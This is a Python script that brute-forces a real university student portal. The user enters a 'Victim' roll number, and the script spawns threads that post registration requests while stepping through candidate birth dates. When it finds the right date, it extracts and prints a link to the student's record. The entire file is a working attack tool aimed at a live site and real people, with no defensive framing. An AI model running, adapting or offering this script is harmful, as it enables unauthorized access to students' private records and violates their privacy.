import re
import threading
import requests as r
from datetime import datetime, timedelta

CYAN, GREEN, FAIL, ENDC = '\033[96m', '\033[92m', '\033[91m', '\033[0m'
url, link = "https://studentportal.hindustanuniv.ac.in/search/studentReg.htm", [REDACTED]

class multiErp(threading.Thread):
    content = None

    def __init__(self, regi, starting):
        super().__init__()
        self.payload = {'form_name': 'form1', 'hidAdmNo': regi, 'hidDob': starting,
                        'createLogin': 'Proceed to Registration'}
        self.start()

    def run(self):
        try:
            count = 0
            while count < 9:
                content = r.post(url, data=self.payload)
                if content.content[:1] == b'<':
                    self.payload['hidDob'] = (
                                datetime.strptime(self.payload['hidDob'], '%d/%m/%Y') + timedelta(days=1)).strftime(
                        '%d/%m/%Y')
                    count += 1
                else:
                    return print(f"""\n{CYAN}──────▄▌▐▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀​▀▀▀▀▀▀▌{ENDC}
───▄▄██▌█ BEEP BEEP
▄▄▄▌▐██▌█ {CYAN}"""+link.replace('*', re.search("Report\((.*),", content.text).group(1))+f"""
███████▌█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄​▄▄▄▄▄▄▌
▀{FAIL}(@)▀▀▀▀▀▀▀(@)(@)▀▀▀▀▀▀▀▀▀▀▀▀▀​▀▀▀▀(@){CYAN}▀{ENDC}""")
        except Exception as e:
            print(FAIL + str(e) + self.payload['hidDob'] + ENDC)
        except KeyboardInterrupt as e:
            print(FAIL + str(e) + self.payload['hidDob'] + ENDC)


class Trigger:
    regi, starting, count = None, None, 0

    def __init__(self, year=int(input(CYAN + "Enter the No. of year: " + ENDC)),
                 regi=input(CYAN + "Roll No. of " + FAIL + "Victim: " + ENDC), starting=input(
                CYAN + "Enter the DOB: " + GREEN + "(before " + FAIL + "Victim" + GREEN + " has born⚠) " + ENDC)):
        self.regi, self.starting = regi, starting
        while self.count <= 41 * year:
            multiErp(self.regi, self.starting)
            self.starting = (datetime.strptime(self.starting, '%d/%m/%Y') + timedelta(days=9)).strftime('%d/%m/%Y')
            self.count += 1
        print(GREEN+"Please Wait..."+CYAN+"¯\_(ツ)_/¯"+ENDC)
        
Trigger()
